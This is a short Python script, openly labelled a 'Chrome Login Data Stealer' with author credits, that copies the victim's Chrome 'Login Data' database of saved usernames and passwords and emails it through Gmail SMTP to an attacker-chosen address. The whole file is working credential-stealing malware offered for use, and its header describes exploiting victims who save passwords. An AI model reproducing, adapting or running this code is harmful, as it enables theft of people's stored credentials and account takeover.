
'''
#######################CHROME LOGIN DATA STEALER#######################
#######################By: Abhishek Iyengar##########################
#######################GitHub: TinShade##############################
#######################Twitter: @TinShade############################

This small script steal the local DB used by Chrome to store user data like usernames and passwords 
to websites that have auto-save for authentication fields. Most users like to hit save for convenience; this 
script exploits that nature of the victim to steal all stored data and mail it to the email ID in the mail module.

#NOTE: Make sure you have your email account set to allow 'Less Secure App Access'. Especially for GMail accounts.
'''
import smtplib 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 
import os
fromaddr = "YOUR EMAIL ID "
toaddr = "YOUR EMAIL ID "
msg = MIMEMultipart() 
msg['From'] = fromaddr 
msg['To'] = toaddr 
msg['Subject'] = "Chrome DB"
body = "Find the attached file for the database details!"
msg.attach(MIMEText(body, 'plain')) 
filename = "Login Data"
filepath = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
attachment = open(filepath, "rb") 
p = MIMEBase('application', 'octet-stream') 
p.set_payload((attachment).read()) 
encoders.encode_base64(p) 

p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
msg.attach(p) 
s = smtplib.SMTP('smtp.gmail.com', 587) 
s.starttls() 
s.login(fromaddr, "YOUR PASSWORD") 
text = msg.as_string() 
s.sendmail(fromaddr, toaddr, text) 
s.quit() 